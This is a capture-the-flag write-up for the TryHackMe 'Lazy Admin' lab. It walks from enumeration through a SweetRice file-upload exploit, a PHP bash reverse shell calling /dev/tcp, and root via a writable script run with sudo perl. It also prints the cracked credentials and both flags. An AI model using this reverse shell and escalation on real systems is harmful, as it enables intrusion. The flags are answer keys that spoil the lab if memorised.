## Lazy Admin - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/lazyadmin)

Have some fun! There might be multiple ways to get user access.

Note: It might take 2-3 minutes for the machine to boot

**IP: 10.10.98.169**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation <br>

**Tools Used**: Nmap, Gobuster

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20CUT.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap and Gobuster.

  ```
  nmap -sC -sV -T5 -p- 10.10.98.169
  
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
  |   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
  |_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u http://10.10.98.169 -w /usr/share/wordlists/dirb/common.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.hta                 (Status: 403) [Size: 277]
  /.htpasswd            (Status: 403) [Size: 277]
  /.htaccess            (Status: 403) [Size: 277]
  /content              (Status: 301) [Size: 314] [--> http://10.10.98.169/content/]
  /index.html           (Status: 200) [Size: 11321]
  /server-status        (Status: 403) [Size: 277]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================

  gobuster dir -u http://10.10.98.169/content -w /usr/share/wordlists/dirb/common.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.hta                 (Status: 403) [Size: 277]
  /.htpasswd            (Status: 403) [Size: 277]
  /_themes              (Status: 301) [Size: 322] [--> http://10.10.98.169/content/_themes/]
  /.htaccess            (Status: 403) [Size: 277]
  /as                   (Status: 301) [Size: 317] [--> http://10.10.98.169/content/as/]
  /attachment           (Status: 301) [Size: 325] [--> http://10.10.98.169/content/attachment/]
  /images               (Status: 301) [Size: 321] [--> http://10.10.98.169/content/images/]
  /inc                  (Status: 301) [Size: 318] [--> http://10.10.98.169/content/inc/]
  /index.php            (Status: 200) [Size: 2198]
  /js                   (Status: 301) [Size: 317] [--> http://10.10.98.169/content/js/]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- When I visited `http://10.10.98.169/content/` I saw that it's a `SweetRice` page so I immediately started looking for some exploits. I found [this exploit](https://www.exploit-db.com/exploits/40716) for Arbitrary File Upload in addition to XSS and SQLI exploits.

- After digging through assets I also found login page `http://10.10.98.169/content/as/` where I spent some time trying for SQLI.
  
- Since this exploit requires username and password I saved it for later and continued digging through newly found directories where I found `mysql_bakup_20191129023059-1.5.1.sql` on `http://10.10.98.169/content/inc/mysql_backup/` which is exactly what I needed.

  ```
  cat mysql_bakup_20191129023059-1.5.1.sql 
  \\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\"
  ```
  
- After checking the databse backup I found admin credentials, cracked the MD5 hash and got the password `Password123`. Perfect, now I can get access to targets database.

---

## ⚙️ Shell Access

- OK, so I did some exploring after logging in with found credentials, you can upload files from manager account but I decided to use the exploit that I already found. Exploit requires 4 inputs: url, username, password and file name.
  Since I already have all necessary requirements except the shell, I just made one.

  ```
  nano shell.php5

  <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/[YOUR-THM-IP]/4444 0>&1'");
  ```
  
- Shell created, let's uploaded with exploit. Running exploit is pretty simple, download it from Exploit DB and run it with python then provide all necessary inputs.

  ```
  python3 40716.py

  +-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
  |  _________                      __ __________.__                  |
  | /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
  | \_____  \ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
  | /        \     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
  |/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
  |        \/             \/     \/            \/        \/    \/     |                                                    
  |    > SweetRice 1.5.1 Unrestricted File Upload                     |
  |    > Script Cod3r : Ehsan Hosseini                                |
  +-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
  
  Enter The Target URL(Example : localhost.com) : 10.10.98.169/content
  Enter Username : manager
  Enter Password : Password123
  Enter FileName (Example:.htaccess,shell.php5,index.html) : shell.php5
  [+] Sending User&Pass...
  [+] Login Succssfully...
  [+] File Uploaded...
  [+] URL : http://10.10.98.169/content/attachment/shell.php5
  ```
  
- Beautiful, now you know the hustle, start listener and visit the shell location `http://10.10.98.169/content/attachment/shell.php5`.

  ```
  nc -lvnp 4444

  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.98.169] 48130
  Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
   18:17:43 up 58 min,  0 users,  load average: 0.00, 0.00, 0.00
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /bin/sh: 0: can't access tty; job control turned off
  $ whoami
  www-data
  ```

- We are in ladies and gents, now let's get those flags! I also changed it to putty shell since I love it and it's more stable.

  ```
  $ python3 -c 'import pty;pty.spawn("/bin/bash")'
  www-data@THM-Chal:/$ ^Z
  zsh: suspended  nc -lvnp 4444
                                                                                                                       
  stty raw -echo; fg
  [1]  + continued  nc -lvnp 4444
                                 export TERM=xterm
  www-data@THM-Chal:/$ whoami
  www-data
  ```

---

## 🧍 User Privilege Escalation

- User flag is tutorial. Let's move to root.

  ```
  find / -name user.txt 2>/dev/null
  /home/itguy/user.txt
  
  cat /home/itguy/user.txt
  THM{63e5bce9271952aad1113b6f1ac28a07}
  ```

---

## 👑 Root Privilege Escalation

- Root flag was also pretty easy ngl, I did `sudo -l` first as always and found that I can run perl as sudo.

  ```
  www-data@THM-Chal:/$ sudo -l
  Matching Defaults entries for www-data on THM-Chal:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User www-data may run the following commands on THM-Chal:
      (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
  ```
  
- Then I checked `/backup.pl` which executes `/etc/copy.sh`. So if I have permission to write to `/etc/copy.sh` I can simply modify it to whatever I want and the run it with perl. That's exactly what I did, check for permissions and then change the code.

  ```
  cat /home/itguy/backup.pl
  #!/usr/bin/perl
  
  system("sh", "/etc/copy.sh");

  ls -l /etc/copy.sh
  -rw-r--rwx 1 root root
  ```
  
- In regards to editing `/etc/copy.sh` just delete everything inside and replace it with `/bin/bash` then run the perl command `/usr/bin/perl /home/itguy/backup.pl` and you'll have root.

  ```
  nano /etc/copy.sh
  /bin/bash

  /usr/bin/perl /home/itguy/backup.pl

  root@THM-Chal:/# whoami
  root
  
  root@THM-Chal:/# id  
  uid=0(root) gid=0(root) groups=0(root)
  
  root@THM-Chal:/# cat /root/root.txt
  THM{6637f41d0177b6f37cb20d775124699f}
  ```

---

## 🏁 Flags

- **User Flag**: `THM{63e5bce9271952aad1113b6f1ac28a07}`
- **Root Flag**: `THM{6637f41d0177b6f37cb20d775124699f}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Just sharpening my skills.`

- What did I learn?
  `New exploits/exploitation.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
